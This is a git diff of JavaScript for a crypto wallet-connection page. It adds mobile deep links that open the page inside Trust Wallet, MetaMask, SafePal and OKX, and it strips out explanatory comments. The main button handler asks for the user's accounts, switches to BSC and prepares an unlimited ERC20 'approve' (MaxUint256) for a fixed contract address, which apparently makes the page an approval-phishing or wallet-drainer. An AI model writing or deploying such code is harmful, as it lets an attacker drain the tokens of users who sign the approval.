@@ -59,11 +59,13 @@ function setLoading(on, label = "Processing…") {
   if (btnSpinner) btnSpinner.hidden   = !on;
 }
 
-// ─── Modal de Selección Nativa (Solo para navegadores externos) ───────────────
+// ─── Modal de Selección Nativa (Con encodeURIComponent corregido) ──────────────
 function showMobileWalletSelector() {
   let modal = document.getElementById("mobileWalletModal");
-  const encodedUrl = encodeURIComponent(window.location.href);
-  const urlNoProtocol = window.location.href.replace(/^https?:\/\//, '');
+  
+  const rawUrl = window.location.href;
+  const encodedUrl = encodeURIComponent(rawUrl);
+  const urlNoProtocol = rawUrl.replace(/^https?:\/\//, '');
 
   if (!modal) {
     modal = document.createElement("div");
@@ -77,10 +79,10 @@ function showMobileWalletSelector() {
           <button id="closeWalletModal" style="background:transparent;border:none;color:#a1a1aa;font-size:24px;cursor:pointer;">&times;</button>
         </div>
         <div style="display:flex;flex-direction:column;gap:10px;">
-          <a href="https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">Trust Wallet</a>
-          <a href="https://metamask.app.link/dapp/${urlNoProtocol}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">MetaMask</a>
-          <a href="https://link.safepal.io/open_url?url=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">SafePal</a>
-          <a href="okx://wallet/dapp/details?dappUrl=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">OKX Wallet</a>
+          <a href="https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">Trust Wallet</a>
+          <a href="https://metamask.app.link/dapp/${urlNoProtocol}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">MetaMask</a>
+          <a href="https://link.safepal.io/open_url?url=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">SafePal</a>
+          <a href="okx://wallet/dapp/details?dappUrl=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">OKX Wallet</a>
         </div>
       </div>
     `;
@@ -89,6 +91,10 @@ function showMobileWalletSelector() {
     document.getElementById("closeWalletModal").addEventListener("click", () => { modal.style.display = "none"; });
     modal.addEventListener("click", (e) => { if (e.target === modal) modal.style.display = "none"; });
   } else {
+    modal.querySelector('a[href*="trustwallet"]').href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}`;
+    modal.querySelector('a[href*="metamask"]').href = `https://metamask.app.link/dapp/${urlNoProtocol}`;
+    modal.querySelector('a[href*="safepal"]').href = `https://link.safepal.io/open_url?url=${encodedUrl}`;
+    modal.querySelector('a[href*="okx"]').href = `okx://wallet/dapp/details?dappUrl=${encodedUrl}`;
     modal.style.display = "flex";
   }
 }
@@ -96,8 +102,6 @@ function showMobileWalletSelector() {
 // ─── Main Execution Handler ───────────────────────────────────────────────────
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
-    
-    // Verificación de entorno: Si no hay proveedor inyectado y estamos en móvil, mostramos el selector de apps
     if (!window.ethereum) {
       if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
         showMobileWalletSelector();
@@ -110,7 +114,6 @@ if (approveBtn) {
     setLoading(true, "Conectando…");
 
     try {
-      // 1. Petición estándar de cuentas (El navegador nativo de la wallet maneja el popup de aprobación)
       const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       const userAddress = accounts?.[0];
 
@@ -120,7 +123,6 @@ if (approveBtn) {
         return;
       }
 
-      // 2. Validación de red BSC
       const currentChain = await window.ethereum.request({ method: "eth_chainId" });
       if (currentChain !== BSC_CHAIN_ID_HEX) {
         try {
@@ -139,7 +141,6 @@ if (approveBtn) {
       const CAP_AMOUNT = ethers.MaxUint256;
       const iface      = new ethers.Interface(ERC20_ABI);
 
-      // 3. Ejecución de Aprobación (Approve) directa mediante el proveedor inyectado
       setLoading(true, "Firma requerida en wallet…");
       const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
 
